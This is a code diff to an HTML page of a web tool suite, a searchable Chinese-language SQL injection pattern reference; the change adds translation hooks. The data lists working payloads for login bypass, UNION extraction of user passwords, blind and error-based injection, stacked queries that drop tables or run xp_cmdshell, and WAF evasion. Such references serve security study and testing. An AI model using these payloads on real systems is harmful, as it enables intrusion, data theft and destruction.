@@ -6,32 +6,33 @@
 <header class="global-header"><a href="../../index.html" class="logo">S-Jiffy</a><select id="langSwitch" class="lang-switch" aria-label="Language"><option value="en">English</option><option value="zh-CN">简体中文</option><option value="zh-TW">繁体中文（台灣）</option><option value="zh-HK">繁体中文（香港）</option><option value="es">Español</option><option value="ja">日本語</option></select><a href="../../index.html" class="back-btn">← 返回</a></header>
 <main class="tool-workspace"><h1 data-i18n="h1">SQL 注入模式参考</h1><p class="tool-desc" data-i18n="desc">常见 SQL 注入攻击模式、技术分类和绕过技巧速查</p>
 <div class="card"><div class="search-box"><input id="searchInput" class="input js-focus-input" placeholder="搜索模式、描述、分类..."></div><div id="patternsList"></div></div>
-<div class="output-box"><span id="outputText"></span><button class="copy-btn" id="copyBtn">复制</button></div>
+<div class="output-box"><span id="outputText"></span><button class="copy-btn" id="copyBtn" data-i18n="ui.copy">复制</button></div>
 </main>
-<footer class="global-footer"><div class="tool-status" id="statusBar"></div><div>S-Jiffy · 即用即走</div></footer>
+<footer class="global-footer"><div class="tool-status" id="statusBar"></div><div data-i18n="common.footer">S-Jiffy · 即用即走</div></footer>
 <script src="../../assets/js/global.js"></script>
+  <script src="../../assets/js/i18n.js"></script></script>
 <script>(function(){
 var categories=[
-{name:'认证绕过',patterns:[
-{pattern:"' OR '1'='1",desc:'始终返回 true，绕过登录验证',risk:'high'},{pattern:"' OR 1=1 --",desc:'注释掉后续 SQL，绕过认证',risk:'high'},{pattern:"admin' --",desc:'以 admin 用户身份绕过密码检查',risk:'high'},{pattern:"' OR '1'='1' #",desc:'MySQL 注释风格绕过',risk:'high'},{pattern:"' OR '1'='1'/*",desc:'多行注释绕过',risk:'high'}
+{name: t('ui.32','认证绕过'),patterns:[
+{pattern:"' OR '1'='1",desc: t('ui.31','始终返回 true，绕过登录验证'),risk:'high'},{pattern:"' OR 1=1 --",desc: t('ui.30','注释掉后续 SQL，绕过认证'),risk:'high'},{pattern:"admin' --",desc: t('ui.29','以 admin 用户身份绕过密码检查'),risk:'high'},{pattern:"' OR '1'='1' #",desc: t('ui.28','MySQL 注释风格绕过'),risk:'high'},{pattern:"' OR '1'='1'/*",desc: t('ui.27','多行注释绕过'),risk:'high'}
 ]},
-{name:'UNION 查询',patterns:[
-{pattern:"' UNION SELECT null,username,password FROM users --",desc:'联合查询提取用户表数据',risk:'high'},{pattern:"' UNION SELECT 1,2,3 --",desc:'探测列数',risk:'medium'},{pattern:"' UNION SELECT @@version,2,3 --",desc:'获取数据库版本信息',risk:'medium'}
+{name: t('ui.26','UNION 查询'),patterns:[
+{pattern:"' UNION SELECT null,username,password FROM users --",desc: t('ui.25','联合查询提取用户表数据'),risk:'high'},{pattern:"' UNION SELECT 1,2,3 --",desc: t('ui.24','探测列数'),risk:'medium'},{pattern:"' UNION SELECT @@version,2,3 --",desc: t('ui.23','获取数据库版本信息'),risk:'medium'}
 ]},
-{name:'报错注入',patterns:[
-{pattern:"' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version))) --",desc:'MySQL ExtractValue 报错注入',risk:'high'},{pattern:"' AND UpdateXML(1, CONCAT(0x7e, (SELECT user())), 1) --",desc:'MySQL UpdateXML 报错注入',risk:'high'},{pattern:"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",desc:'MySQL 分组报错注入',risk:'high'}
+{name: t('ui.22','报错注入'),patterns:[
+{pattern:"' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version))) --",desc: t('ui.21','MySQL ExtractValue 报错注入'),risk:'high'},{pattern:"' AND UpdateXML(1, CONCAT(0x7e, (SELECT user())), 1) --",desc: t('ui.20','MySQL UpdateXML 报错注入'),risk:'high'},{pattern:"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",desc: t('ui.19','MySQL 分组报错注入'),risk:'high'}
 ]},
-{name:'布尔盲注',patterns:[
-{pattern:"' AND SUBSTRING((SELECT database()),1,1)='a' --",desc:'逐字符爆破数据库名',risk:'medium'},{pattern:"' AND IF(1=1,SLEEP(5),0) --",desc:'基于时间的布尔判断',risk:'medium'}
+{name: t('ui.18','布尔盲注'),patterns:[
+{pattern:"' AND SUBSTRING((SELECT database()),1,1)='a' --",desc: t('ui.17','逐字符爆破数据库名'),risk:'medium'},{pattern:"' AND IF(1=1,SLEEP(5),0) --",desc: t('ui.16','基于时间的布尔判断'),risk:'medium'}
 ]},
-{name:'时间盲注',patterns:[
-{pattern:"' OR IF((SELECT LENGTH(database()))>5,SLEEP(3),0) --",desc:'基于 SLEEP 的时间延迟注入',risk:'medium'},{pattern:"'; WAITFOR DELAY '0:0:5' --",desc:'SQL Server WAITFOR 延迟',risk:'medium'},{pattern:"' OR pg_sleep(5) --",desc:'PostgreSQL pg_sleep 延迟',risk:'medium'}
+{name: t('ui.15','时间盲注'),patterns:[
+{pattern:"' OR IF((SELECT LENGTH(database()))>5,SLEEP(3),0) --",desc: t('ui.14','基于 SLEEP 的时间延迟注入'),risk:'medium'},{pattern:"'; WAITFOR DELAY '0:0:5' --",desc: t('ui.13','SQL Server WAITFOR 延迟'),risk:'medium'},{pattern:"' OR pg_sleep(5) --",desc: t('ui.12','PostgreSQL pg_sleep 延迟'),risk:'medium'}
 ]},
-{name:'堆叠查询',patterns:[
-{pattern:"'; DROP TABLE users --",desc:'执行多条语句，删除表',risk:'high'},{pattern:"'; INSERT INTO users VALUES ('hacker','pass') --",desc:'堆叠插入恶意用户',risk:'high'},{pattern:"'; EXEC xp_cmdshell('whoami') --",desc:'SQL Server 执行系统命令',risk:'high'}
+{name: t('ui.11','堆叠查询'),patterns:[
+{pattern:"'; DROP TABLE users --",desc: t('ui.10','执行多条语句，删除表'),risk:'high'},{pattern:"'; INSERT INTO users VALUES ('hacker','pass') --",desc: t('ui.9','堆叠插入恶意用户'),risk:'high'},{pattern:"'; EXEC xp_cmdshell('whoami') --",desc: t('ui.8','SQL Server 执行系统命令'),risk:'high'}
 ]},
-{name:'绕过技巧',patterns:[
-{pattern:"' UNUNIONION SELSELECTECT",desc:'关键字分割绕过简单 WAF 过滤',risk:'medium'},{pattern:"'/*!*/OR/**/1=1",desc:'MySQL 注释块绕过',risk:'medium'},{pattern:"%27%20OR%201%3D1%20--",desc:'URL 编码绕过',risk:'medium'},{pattern:"'||'1'||'",desc:'Oracle 字符串连接绕过',risk:'medium'}
+{name: t('ui.7','绕过技巧'),patterns:[
+{pattern:"' UNUNIONION SELSELECTECT",desc: t('ui.6','关键字分割绕过简单 WAF 过滤'),risk:'medium'},{pattern:"'/*!*/OR/**/1=1",desc: t('ui.5','MySQL 注释块绕过'),risk:'medium'},{pattern:"%27%20OR%201%3D1%20--",desc: t('ui.4','URL 编码绕过'),risk:'medium'},{pattern:"'||'1'||'",desc: t('ui.3','Oracle 字符串连接绕过'),risk:'medium'}
 ]}
 ];
 var searchInput=document.getElementById('searchInput'),patternsList=document.getElementById('patternsList'),outputText=document.getElementById('outputText'),copyBtn=document.getElementById('copyBtn');
@@ -49,11 +50,11 @@ function render(q){
     if(catCount>0)html+='<div class="cat-title">'+htmlEscape(cat.name)+'</div>'+catHtml;
   }
   patternsList.innerHTML=html||'<div style="color:var(--color-text-secondary);padding:8px;">无匹配模式</div>';
-  outputText.textContent='共 '+total+' 个注入模式';
-  setStatus(total+' 个模式');
+  outputText.textContent = t('ui.total','共 ')+total+ t('ui.2',' 个注入模式');
+  setStatus(total+ t('ui.1',' 个模式'));
 }
 render('');
 searchInput.addEventListener('input',function(){render(this.value);});
-copyBtn.addEventListener('click',function(){if(outputText.textContent){copyToClipboard(outputText.textContent,this);setStatus('已复制');}});
+copyBtn.addEventListener('click',function(){if(outputText.textContent){copyToClipboard(outputText.textContent,this);setStatus(t('ui.copied','已复制'));}});
 })();</script>
 </body></html>
